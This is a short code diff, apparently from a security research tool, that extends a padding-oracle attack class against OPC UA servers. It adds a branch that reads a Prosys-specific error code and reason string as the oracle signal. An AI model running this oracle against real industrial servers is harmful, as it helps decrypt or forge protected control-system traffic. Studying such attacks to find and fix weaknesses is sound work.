@@ -631,12 +631,14 @@ class OPNPaddingOracle(PaddingOracle):
       self._msg.encodedPart = ciphertext
       opc_exchange(self._socket, self._msg)
       return True
-    except ServerError as err:
-      # print(hex(err.errorcode))
+    except ServerError as err:      
       if err.errorcode == 0x80580000:
         return True
       elif err.errorcode == 0x80130000:
         return False
+      elif err.errorcode == 0x80010000:
+        # Prosys specific oracle.
+        return 'block incorrect' not in err.reason
       else:
         raise err
       
